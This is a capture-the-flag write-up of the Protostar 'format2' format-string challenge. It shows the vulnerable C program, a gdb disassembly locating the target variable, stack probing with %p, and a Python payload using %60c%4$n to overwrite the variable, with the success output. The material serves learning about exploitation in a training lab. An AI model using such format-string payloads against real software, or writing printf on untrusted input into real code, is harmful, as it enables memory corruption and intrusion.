# FORMAT 2

## SOURCE CODE

```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);
  printf(buffer);                       //   <--  Format String vulnerability
  
  if(target == 64) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %d :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

## OVERVIEW & IDEA

- This chall has fixed the number of byte when enter input. So we can't use BOF. But we can change the target with format string vulnerability like we did in format 0 & 1. However, we must calculate the size of printed string to modifide the target to 64.

## DETAIL

- To change the value of target, first we must know the address of target we can find it by disassemble vuln function.

```asm
(gdb) disass vuln
Dump of assembler code for function vuln:
0x08048454 <vuln+0>:    push   ebp
0x08048455 <vuln+1>:    mov    ebp,esp
0x08048457 <vuln+3>:    sub    esp,0x218
0x0804845d <vuln+9>:    mov    eax,ds:0x80496d8
0x08048462 <vuln+14>:   mov    DWORD PTR [esp+0x8],eax
0x08048466 <vuln+18>:   mov    DWORD PTR [esp+0x4],0x200
0x0804846e <vuln+26>:   lea    eax,[ebp-0x208]
0x08048474 <vuln+32>:   mov    DWORD PTR [esp],eax
0x08048477 <vuln+35>:   call   0x804835c <fgets@plt>
0x0804847c <vuln+40>:   lea    eax,[ebp-0x208]
0x08048482 <vuln+46>:   mov    DWORD PTR [esp],eax
0x08048485 <vuln+49>:   call   0x804837c <printf@plt>
0x0804848a <vuln+54>:   mov    eax,ds:0x80496e4           ;   <- address of target
0x0804848f <vuln+59>:   cmp    eax,0x40                   ;   <- if (target == 64)
0x08048492 <vuln+62>:   jne    0x80484a2 <vuln+78>
0x08048494 <vuln+64>:   mov    DWORD PTR [esp],0x8048590
0x0804849b <vuln+71>:   call   0x804838c <puts@plt>
0x080484a0 <vuln+76>:   jmp    0x80484b9 <vuln+101>
0x080484a2 <vuln+78>:   mov    edx,DWORD PTR ds:0x80496e4
0x080484a8 <vuln+84>:   mov    eax,0x80485b0
0x080484ad <vuln+89>:   mov    DWORD PTR [esp+0x4],edx
0x080484b1 <vuln+93>:   mov    DWORD PTR [esp],eax
0x080484b4 <vuln+96>:   call   0x804837c <printf@plt>
0x080484b9 <vuln+101>:  leave
0x080484ba <vuln+102>:  ret
End of assembler dump.
```

- Then we find the index of input on stack, this purpose of stuff is feed the `%n` specifier to write value on stack. And I found the index of input is 4.

```
root@protostar:/opt/protostar/bin# ./format2
AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
AAAA.0x200.0xb7fd8420.0xbffffb04.0x41414141.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0xa
target is 0 :(
```

- Finally, I use `%n` specifier to take address of input on stack and use `%[number]c` to size the output printed string that will change the content of fed address.

## EXPLOIT

```python
# filename: exp.py

payload = "\xe4\x96\x04\x08"   # address of target in little-edian
#  we want to write 64 bytes on content of target's address so we must be padding the output by 64-4 bytes
# by using %[number]c, then, I add %4$n to feed the 4th argument that is address of target to %n

payload += "%60c%4$n"
# after run printf(buffer); the content of target will change to size of printed string, which is 64

print(payload)

# python exp.py | ./format2
```

## RESULT

```
root@protostar:/opt/protostar/bin# python exp.py | ./format2
�
you have modified the target :)
```